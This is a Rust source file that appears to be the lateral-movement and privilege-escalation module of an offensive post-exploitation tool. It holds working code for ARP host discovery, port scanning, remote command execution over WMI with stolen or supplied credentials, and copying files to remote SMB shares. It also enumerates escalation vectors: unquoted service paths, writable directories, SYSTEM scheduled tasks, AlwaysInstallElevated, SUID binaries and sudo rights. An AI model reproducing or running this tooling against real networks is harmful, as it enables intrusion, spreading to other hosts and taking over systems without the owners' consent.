use log::{info, error};

pub struct LateralMovement;

impl LateralMovement {
    /// Discover hosts on the local network via ARP scan
    pub fn discover_hosts() -> Result<String, String> {
        #[cfg(target_os = "windows")]
        {
            let output = std::process::Command::new("arp")
                .arg("-a")
                .output()
                .map_err(|e| format!("ARP scan failed: {}", e))?;
            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let output = std::process::Command::new("arp")
                .arg("-a")
                .output()
                .map_err(|e| format!("ARP scan failed: {}", e))?;
            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        }
    }

    /// Port scan a target host for common services
    pub async fn port_scan(target: &str, ports: &[u16]) -> Result<String, String> {
        use tokio::net::TcpStream;
        use tokio::time::{timeout, Duration};

        let mut open_ports = Vec::new();
        for &port in ports {
            let addr = format!("{}:{}", target, port);
            if let Ok(Ok(_)) = timeout(Duration::from_millis(500), TcpStream::connect(&addr)).await {
                let service = match port {
                    21 => "FTP",
                    22 => "SSH",
                    23 => "Telnet",
                    25 => "SMTP",
                    53 => "DNS",
                    80 => "HTTP",
                    110 => "POP3",
                    135 => "RPC",
                    139 => "NetBIOS",
                    143 => "IMAP",
                    443 => "HTTPS",
                    445 => "SMB",
                    993 => "IMAPS",
                    995 => "POP3S",
                    1433 => "MSSQL",
                    1521 => "Oracle",
                    3306 => "MySQL",
                    3389 => "RDP",
                    5432 => "PostgreSQL",
                    5900 => "VNC",
                    8080 => "HTTP-Alt",
                    8443 => "HTTPS-Alt",
                    _ => "Unknown",
                };
                open_ports.push(format!("  {}:{} - {} (open)", target, port, service));
                info!("Port scan: {}:{} open ({})", target, port, service);
            }
        }

        if open_ports.is_empty() {
            Ok(format!("No open ports found on {}", target))
        } else {
            Ok(format!("Open ports on {}:\n{}", target, open_ports.join("\n")))
        }
    }

    /// Default ports for quick scan
    pub fn common_ports() -> Vec<u16> {
        vec![21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
             1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
    }

    /// Execute command on remote host via WMI (Windows only)
    #[cfg(target_os = "windows")]
    pub fn wmi_exec(target: &str, username: &str, password: &str, command: &str) -> Result<String, String> {
        let output = std::process::Command::new("wmic")
            .args([
                &format!("/node:{}", target),
                &format!("/user:{}", username),
                &format!("/password:{}", password),
                "process",
                "call",
                "create",
                command,
            ])
            .output()
            .map_err(|e| format!("WMI exec failed: {}", e))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        } else {
            Err(String::from_utf8_lossy(&output.stderr).to_string())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn wmi_exec(_target: &str, _username: &str, _password: &str, _command: &str) -> Result<String, String> {
        Err("WMI exec only available on Windows".to_string())
    }

    /// Copy file to remote SMB share
    #[cfg(target_os = "windows")]
    pub fn smb_copy(source: &str, target_host: &str, share: &str, dest_file: &str) -> Result<String, String> {
        let dest = format!("\\\\{}\\{}\\{}", target_host, share, dest_file);
        let output = std::process::Command::new("cmd")
            .args(["/c", "copy", "/Y", source, &dest])
            .output()
            .map_err(|e| format!("SMB copy failed: {}", e))?;

        if output.status.success() {
            Ok(format!("Copied {} to {}", source, dest))
        } else {
            Err(String::from_utf8_lossy(&output.stderr).to_string())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn smb_copy(_source: &str, _target_host: &str, _share: &str, _dest_file: &str) -> Result<String, String> {
        Err("SMB copy only available on Windows".to_string())
    }
}

pub struct PrivilegeEscalation;

impl PrivilegeEscalation {
    /// Check current privilege level and potential escalation vectors
    pub fn check() -> String {
        let mut results = Vec::new();

        // Check current user
        #[cfg(target_os = "windows")]
        {
            if let Ok(output) = std::process::Command::new("whoami").arg("/priv").output() {
                let privs = String::from_utf8_lossy(&output.stdout);
                results.push(format!("=== Current Privileges ===\n{}", privs));
            }

            if let Ok(output) = std::process::Command::new("whoami").arg("/groups").output() {
                let groups = String::from_utf8_lossy(&output.stdout);
                let is_admin = groups.contains("S-1-5-32-544");
                results.push(format!("=== Group Membership ===\nAdmin: {}\n{}", is_admin, groups));
            }

            // Check for unquoted service paths
            if let Ok(output) = std::process::Command::new("wmic")
                .args(["service", "get", "name,displayname,pathname,startmode"])
                .output()
            {
                let services = String::from_utf8_lossy(&output.stdout);
                let unquoted: Vec<&str> = services.lines()
                    .filter(|l| l.contains("C:\\") && !l.contains("\"") && l.contains(" "))
                    .collect();
                if !unquoted.is_empty() {
                    results.push(format!("=== Unquoted Service Paths ===\n{}", unquoted.join("\n")));
                }
            }

            // Check for writable service directories
            if let Ok(output) = std::process::Command::new("cmd")
                .args(["/c", "icacls \"C:\\Program Files\" /t /c 2>nul | findstr /i \"(F) (M) (W)\""])
                .output()
            {
                let writable = String::from_utf8_lossy(&output.stdout);
                if !writable.is_empty() {
                    results.push(format!("=== Writable Directories ===\n{}", writable));
                }
            }

            // Check scheduled tasks
            if let Ok(output) = std::process::Command::new("schtasks")
                .args(["/query", "/fo", "LIST", "/v"])
                .output()
            {
                let tasks = String::from_utf8_lossy(&output.stdout);
                let system_tasks: Vec<&str> = tasks.lines()
                    .filter(|l| l.contains("SYSTEM") || l.contains("Run As User"))
                    .take(20)
                    .collect();
                if !system_tasks.is_empty() {
                    results.push(format!("=== SYSTEM Scheduled Tasks ===\n{}", system_tasks.join("\n")));
                }
            }

            // Check AlwaysInstallElevated
            if let Ok(output) = std::process::Command::new("reg")
                .args(["query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated"])
                .output()
            {
                if output.status.success() && String::from_utf8_lossy(&output.stdout).contains("0x1") {
                    results.push("=== AlwaysInstallElevated ENABLED ===\nMSI packages can be installed with SYSTEM privileges!".to_string());
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Ok(output) = std::process::Command::new("id").output() {
                results.push(format!("=== Current User ===\n{}", String::from_utf8_lossy(&output.stdout)));
            }
            // Check SUID binaries
            if let Ok(output) = std::process::Command::new("find")
                .args(["/", "-perm", "-4000", "-type", "f"])
                .output()
            {
                results.push(format!("=== SUID Binaries ===\n{}", String::from_utf8_lossy(&output.stdout)));
            }
            // Check sudo permissions
            if let Ok(output) = std::process::Command::new("sudo").args(["-l"]).output() {
                results.push(format!("=== Sudo Permissions ===\n{}", String::from_utf8_lossy(&output.stdout)));
            }
        }

        results.join("\n\n")
    }
}
